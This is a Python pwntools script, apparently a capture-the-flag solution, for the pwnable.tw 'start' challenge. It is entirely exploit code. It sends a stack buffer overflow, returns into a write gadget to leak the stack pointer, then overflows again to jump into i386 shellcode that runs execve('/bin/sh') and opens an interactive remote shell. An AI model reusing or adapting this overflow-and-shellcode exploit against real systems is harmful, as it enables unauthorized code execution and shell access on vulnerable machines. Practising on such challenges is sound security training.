from pwn import *

context.arch = 'i386'

WRITE = p32(0x08048087)

def leak_esp(r):
    payload = b'A'*20 + WRITE
    io.recvuntil('CTF:')
    io.send(payload)
    esp = u32(io.recv()[:4])
    return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

io = remote('chall.pwnable.tw', 10000)

esp = leak_esp(io)
payload = b"A"*20  + p32(esp + 20) + shellcode 

io.send(payload)
io.interactive()
